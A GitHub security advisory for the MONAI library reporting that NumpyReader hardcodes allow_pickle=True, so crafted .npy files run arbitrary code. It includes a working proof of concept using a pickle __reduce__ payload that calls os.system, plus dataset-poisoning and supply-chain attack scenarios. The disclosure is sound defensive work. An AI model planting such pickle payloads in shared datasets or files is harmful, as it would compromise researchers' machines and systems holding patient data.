# [H] MONAI: Unsafe deserialization in NumpyReader allows arbitrary code execution via malicious .npy files

## Summary
Severity: High
Advisory: GHSA-wg9g-w2j2-8pgr
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-wg9g-w2j2-8pgr
Type: github-advisory

## Affected
- PyPI: `monai` — affected >=0 <1.6.0

## Details
### Summary

The `NumpyReader` class in `monai/data/image_reader.py` unconditionally uses `np.load(name, allow_pickle=True)` (line 1276), enabling arbitrary code execution when loading a crafted `.npy` or `.npz` file. This affects all MONAI versions up to and including the latest commit (5b71547). The `allow_pickle` parameter is hardcoded to `True` and cannot be overridden by the user (the docstring explicitly states kwargs are accepted "except `allow_pickle`").

### Details

**Vulnerable code** ([permalink](https://github.com/Project-MONAI/MONAI/blob/5b71547/monai/data/image_reader.py#L1276)):

```python
# monai/data/image_reader.py, line 1276, in NumpyReader.read()
img = np.load(name, allow_pickle=True, **kwargs_)
```

The `NumpyReader` is automatically selected by MONAI's `LoadImage` transform for any file with `.npy` or `.npz` extension (see `monai/transforms/io/array.py` line 68: `"numpyreader": NumpyReader`). This means the entire standard data pipeline (LoadImage, PersistentDataset, CacheDataset, SmartCacheDataset, etc.) is vulnerable.

The `allow_pickle=True` parameter enables Python's pickle protocol during numpy loading. Pickle is known to be unsafe for untrusted data, as it can execute arbitrary code during deserialization via the `__reduce__` method.

**Compare with safe practices in the same project:**

The MONAI project has already addressed similar deserialization issues in other code paths:
- `torch.load` calls now use `weights_only=True` (after GHSA-6vm5-6jv9-rjpj)
- `PersistentDataset` defaults to `weights_only=True` (line 272-275 of dataset.py)

However, `NumpyReader` was not included in these security improvements.

Additionally, the `NPZDataset` class in the same project correctly uses the default `allow_pickle=False` ([permalink](https://github.com/Project-MONAI/MONAI/blob/5b71547/monai/data/dataset.py#L1433)):

```python
# monai/data/dataset.py, line 1433 — safe usage
dat = np.load(npzfile)  # allow_pickle defaults to False
```

This inconsistency shows that `NumpyReader` was overlooked during security hardening.

**The user cannot override this behavior:**

```python
# monai/data/image_reader.py, line 1233 (docstring)
# kwargs: additional args for `numpy.load` API except `allow_pickle`.
```

The hardcoded `allow_pickle=True` on line 1276 overrides any user attempt to set it via kwargs.

**Data flow:**

1. User creates a data pipeline with `LoadImage` transform or uses any MONAI dataset class
2. A `.npy` or `.npz` file is provided as input (e.g., as part of a shared medical dataset)
3. `LoadImage` selects `NumpyReader` based on file extension
4. `NumpyReader.read()` calls `np.load(name, allow_pickle=True)`
5. Malicious pickle payload in the `.npy` file executes arbitrary code

### PoC

```python
#!/usr/bin/env python3
"""PoC: RCE via NumpyReader allow_pickle=True in MONAI"""
import os
import tempfile
import numpy as np

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('echo "MONAI NumpyReader RCE - Code executed" > /tmp/monai_rce_proof.txt',))

tmpdir = tempfile.mkdtemp(prefix="monai_poc_")
malicious_npy = os.path.join(tmpdir, "malicious_mask.npy")
np.save(malicious_npy, np.array(MaliciousPayload()), allow_pickle=True)

# With MONAI installed:
from monai.data.image_reader import NumpyReader
reader = NumpyReader()
data = reader.read(malicious_npy)

# Verify RCE
proof = "/tmp/monai_rce_proof.txt"
if os.path.exists(proof):
    print(f"[!] CODE EXECUTION CONFIRMED: {open(proof).read().strip()}")
    os.remove(proof)

os.remove(malicious_npy)
os.rmdir(tmpdir)
```

**Output:**
```
[!] CODE EXECUTION CONFIRMED: MONAI NumpyReader RCE - Code executed
```

### Impact

An attacker can achieve arbitrary code execution on any machine running MONAI by:

1. **Dataset poisoning**: Placing a malicious `.npy` file in a shared medical imaging dataset (e.g., on a shared filesystem, HuggingFace, or research data repository). When a researcher loads the dataset through MONAI's standard pipeline, arbitrary code executes.

2. **Supply chain attack**: Contributing a malicious `.npy` file to a MONAI tutorial, example, or bundle that other users download and run.

3. **Lateral movement in medical environments**: In hospital/research settings where MONAI processes shared data, an attacker with access to the data directory can achieve code execution on the processing server.

This is particularly severe in medical/healthcare contexts where MONAI is deployed, as it could lead to compromise of systems handling protected health information (PHI).

## References
- https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-wg9g-w2j2-8pgr
- https://github.com/Project-MONAI/MONAI/pull/8875
- https://github.com/Project-MONAI/MONAI
- https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0
